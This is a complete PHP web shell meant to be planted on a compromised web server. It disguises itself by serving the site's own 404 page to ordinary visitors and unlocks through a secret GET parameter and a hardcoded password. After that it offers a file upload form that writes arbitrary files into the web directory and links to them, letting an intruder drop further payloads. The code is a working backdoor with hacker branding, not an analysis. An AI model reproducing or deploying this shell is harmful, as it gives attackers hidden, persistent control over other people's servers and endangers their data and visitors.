<?php
error_reporting(0);
ini_set('max_execution_time', 0);
session_start();
$name = "diablo";
function login()
{
$random_url = mt_rand(1000000, 247345736453);
$curl = curl_init();
$protocol = 'http://';
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') {
        $protocol = 'https://';
    }
    curl_setopt($curl, CURLOPT_URL, $protocol . $_SERVER['HTTP_HOST'] . '/' . $random_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $server_404 = curl_exec($curl);
    $server_404 = str_replace("/{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
    $server_404 = str_replace("{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
    echo $server_404;
    exit;
}
if (!isset($_SESSION[md5($sexy)])) {
    if (isset($_GET[$name]) && $_GET[$name] == $name) {
        $_SESSION[md5($sexy)] = true;
    } else {
        login();
    }
}

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "xmenhaxor";
$link = "fvck.txt";
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?xXx 日本のハッカー xXx'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?日本のハッカー'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>404 Not Found</title>
<link rel="icon" https://1.top4top.net/p_14405v3810.jpg"><meta name="theme-color" content="black"> </meta> <!--Buat Thumbnail website--> 
<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">



<html><head><title>404 Not Found</title></head>
<style> 
input { margin:0;background-color:#fff;border:1px solid #fff; } 
</style> 
<body>
<h1>Not Found</h1>
<p>The requested URL  was not found on this server.</p><hr>
<form method=post>
<input type="password" name="password"></form></body></html>
      
      <br>
      <br>
      <?php echo $_SESSION['forbidden']; ?>
    </form>
  </td>
</table>
<?php
exit();
}
?>
<?php 
if(isset($_FILES["userfile"]["name"])){ 
  $dir = getcwd() . "/"; 
   $f =$dir . basename($_FILES["userfile"]["name"]); 
    echo "<p>";
echo "<form enctype=\"multipart/form-data\" action=\"{$_SERVER["PHP_SELF"]}\" method=\"POST\">"; 
echo "<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"512000\" />"; 
echo "<b>Select Your File </b>: <input name=\"userfile\" type=\"file\" />"; 
echo "<input type=\"submit\" value=\"Upload\" />"; 
echo "</form>";
if (move_uploaded_file($_FILES["userfile"]["tmp_name"], $f)) { 
     echo "\n"; 
} else {
      echo "Failed";
} echo "</p>";
echo "<style>a{text-decoration: none;}</style>";
if ($_FILES["userfile"]["error"] == 0){ 
  echo "<br><b>Akses </b>: <a href=\"{$_FILES["userfile"]["name"]}\" TARGET=_BLANK>{$_FILES["userfile"]["name"]}</a><br><br>"; 
  echo "<b>Lokasi </b>: ".getcwd() . "\n"; 
} 
} 
exit; 
?>
